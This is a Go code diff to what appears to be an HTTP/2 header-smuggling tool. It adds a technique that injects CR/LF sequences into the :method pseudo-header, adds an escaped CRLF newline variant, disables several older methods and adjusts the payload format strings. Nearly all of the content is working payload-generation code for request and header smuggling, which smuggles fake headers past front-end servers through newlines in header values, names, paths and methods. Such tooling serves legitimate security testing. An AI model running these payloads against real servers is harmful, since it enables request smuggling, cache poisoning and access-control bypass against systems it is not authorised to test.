@@ -17,17 +17,19 @@ const (
 	HeaderSmugglingNewlineName
 	HeaderSmugglingNewlinePath
 	HeaderSmugglingUnicodeCharacters
+	HeaderSmugglingNewlineMethod
 )
 
 var SmugglingMethods = []SmugglingMethod{
 	HeaderSmugglingNewlineValue,
-	HeaderSmugglingNewlineLongerValue,
+	//HeaderSmugglingNewlineLongerValue,
 	HeaderSmugglingNewlineName,
 	HeaderSmugglingNewlinePath,
 	HeaderSmugglingSpacedHeader,
-	HeaderSmugglingUnderscore,
-	HeaderSmugglingUnicodeCharacters,
-	HeaderSmugglingNone,
+	//HeaderSmugglingUnderscore,
+	//HeaderSmugglingUnicodeCharacters,
+	//HeaderSmugglingNone,
+	HeaderSmugglingNewlineMethod,
 }
 
 type SmugglingVariant fmt.Stringer
@@ -45,16 +47,16 @@ func (s SmugglingMethod) Smuggle(h *Header, url *url.URL, variant SmugglingVaria
 
 	case HeaderSmugglingNewlineValue:
 		v := variant.(*newlineHeaderParams)
-		h.Value = fmt.Sprintf("val%s%s:%s", v.Newline, h.Name, h.Value)
+		h.Value = fmt.Sprintf("val%s%s: %s", v.Newline, h.Name, h.Value)
 		h.Name = v.Header
 
 	case HeaderSmugglingNewlineLongerValue:
 		v := variant.(*newlineHeaderParams)
 		pad := strings.Repeat("0", 10)
 		if strings.HasPrefix(h.Value, "-") {
-			h.Value = fmt.Sprintf("val%s%s:-%s%s", v.Newline, h.Name, pad, h.Value[1:])
+			h.Value = fmt.Sprintf("val%s%s: -%s%s", v.Newline, h.Name, pad, h.Value[1:])
 		} else {
-			h.Value = fmt.Sprintf("val%s%s:%s%s", v.Newline, h.Name, pad, h.Value)
+			h.Value = fmt.Sprintf("val%s%s: %s%s", v.Newline, h.Name, pad, h.Value)
 		}
 
 		h.Name = v.Header
@@ -67,6 +69,11 @@ func (s SmugglingMethod) Smuggle(h *Header, url *url.URL, variant SmugglingVaria
 		v := string(variant.(newlinePathParams))
 		h.Value = fmt.Sprintf("%s HTTP/1.1%s%s: %s%sfake-header: ", url.Path, v, h.Name, h.Value, v)
 		h.Name = ":path"
+
+	case HeaderSmugglingNewlineMethod:
+		v := string(variant.(newlineMethodParams))
+		h.Value = fmt.Sprintf("METHOD / HTTP/1.1%s%s: %s%sfake-header: x", v, h.Name, h.Value, v)
+		h.Name = ":method"
 
 	case HeaderSmugglingUnicodeCharacters:
 		v := variant.(unicodeSmugglingParams)
@@ -95,7 +102,7 @@ func (s SmugglingMethod) Smuggle(h *Header, url *url.URL, variant SmugglingVaria
 }
 
 func (s SmugglingMethod) GetVariants() (variants []SmugglingVariant) {
-	newlines := []string{"\r\n", "\r", "\n"}
+	newlines := []string{"\r\n", "\r", "\n", "\\x0d\\x0a"}
 	switch s {
 	case HeaderSmugglingNone, HeaderSmugglingUnderscore:
 		return []SmugglingVariant{noParams{}}
@@ -108,7 +115,7 @@ func (s SmugglingMethod) GetVariants() (variants []SmugglingVariant) {
 
 	case HeaderSmugglingNewlineName:
 		for _, nl := range newlines {
-			for _, h := range []string{"x", "x:"} {
+			for _, h := range []string{"x", "x: x"} {
 				variants = append(variants, &newlineHeaderParams{nl, h})
 			}
 		}
@@ -124,7 +131,8 @@ func (s SmugglingMethod) GetVariants() (variants []SmugglingVariant) {
 
 	case HeaderSmugglingNewlineLongerValue:
 		for _, nl := range newlines {
-			for _, h := range []string{"header", " header", "x-forwarded-for"} {
+			//for _, h := range []string{"header", " header", "x-forwarded-for"} {
+				for _, h := range []string{"header"} {
 				variants = append(variants, &newlineHeaderParams{nl, h})
 			}
 		}
@@ -135,7 +143,11 @@ func (s SmugglingMethod) GetVariants() (variants []SmugglingVariant) {
 			variants = append(variants, newlinePathParams(nl))
 		}
 		return
-
+	case HeaderSmugglingNewlineMethod:
+		for _, nl := range newlines {
+			variants = append(variants, newlineMethodParams(nl))
+		}
+		return
 	case HeaderSmugglingUnicodeCharacters:
 		return []SmugglingVariant{ReplaceKLetterInValue, ReplaceSLetterInName}
 
@@ -162,6 +174,8 @@ func (s SmugglingMethod) String() string {
 		return "header smuggling via newline in header path"
 	case HeaderSmugglingUnicodeCharacters:
 		return "header smuggling via unicode lowercase/uppercase"
+	case HeaderSmugglingNewlineMethod:
+		return "header smuggling via newline in header method"
 	default:
 		return "unknown header smuggling method"
 	}
@@ -189,7 +203,13 @@ func (p *newlineHeaderParams) String() string {
 
 type newlinePathParams string
 
+type newlineMethodParams string
+
 func (p newlinePathParams) String() string {
+	return fmt.Sprintf("newline=%#v", p)
+}
+
+func (p newlineMethodParams) String() string {
 	return fmt.Sprintf("newline=%#v", p)
 }
 
